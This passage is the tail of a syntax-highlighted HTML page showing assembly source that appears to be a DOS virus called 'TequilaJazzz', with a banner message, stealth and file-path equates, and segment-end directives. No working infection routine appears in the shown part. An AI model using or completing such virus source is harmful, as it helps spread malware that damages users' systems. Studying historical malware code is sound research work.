        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Destructive : None'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'...Удачи в борьбе с вирусами...:)'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

</span><span class="sc5">TequilaLen</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">TeqFilePath</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">StealthPath</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">
</span><span class="sc5">Header</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">ParaLenWSP</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">5000</span><span class="sc4">+</span><span class="sc2">120h</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">TeqTempWSP</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">5000</span><span class="sc4">+</span><span class="sc2">700h</span><span class="sc4">+</span><span class="sc5">MinPRCLen</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">TeqJazzz</span><span class="sc0">    </span><span class="sc9">ends</span><span class="sc0">
                </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">TequilaJazzz</span></div></body>
</html>
